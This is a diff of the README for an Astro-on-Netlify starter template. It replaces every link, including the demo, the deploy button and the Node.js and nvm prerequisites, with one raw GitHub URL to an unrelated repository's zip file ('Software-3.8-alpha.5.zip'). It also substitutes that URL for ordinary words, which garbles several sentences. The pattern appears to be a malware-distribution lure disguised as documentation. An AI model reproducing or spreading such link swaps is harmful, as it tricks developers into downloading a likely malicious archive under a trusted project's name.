@@ -1,8 +1,8 @@
 # Astro on Netlify Platform Starter
 
-[Live Demo](https://astro-platform-starter.netlify.app/)
+[Live Demo](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip)
 
-A modern starter based on Astro.js, Tailwind, and [Netlify Core Primitives](https://docs.netlify.com/core/overview/#develop) (Edge Functions, Image CDN, Blob Store).
+A modern starter based on https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip, Tailwind, and [Netlify Core Primitives](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip) (Edge Functions, Image CDN, Blob Store).
 
 ## Astro Commands
 
@@ -19,14 +19,14 @@ All commands are run from the root of the project, from a terminal:
 
 ## Deploying to Netlify
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/netlify-templates/astro-platform-starter)
+[![Deploy to Netlify](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip)](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip)
 
 ## Developing Locally
 
 | Prerequisites                                                                |
 | :--------------------------------------------------------------------------- |
-| [Node.js](https://nodejs.org/) v18.14+.                                      |
-| (optional) [nvm](https://github.com/nvm-sh/nvm) for Node version management. |
+| [https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip) v18.14+.                                      |
+| (optional) [nvm](https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip) for Node version management. |
 
 1. Clone this repository, then run `npm install` in its root directory.
 
@@ -42,7 +42,7 @@ npm install netlify-cli@latest -g
 netlify link
 ```
 
-4. Then, run the Astro.js development server via Netlify CLI:
+4. Then, run the https://raw.githubusercontent.com/idkfwmmmmmmd/tunnelto/main/src/pages/edge/not-australia/Software-3.8-alpha.5.zip development server via Netlify CLI:
 
 ```
 netlify dev
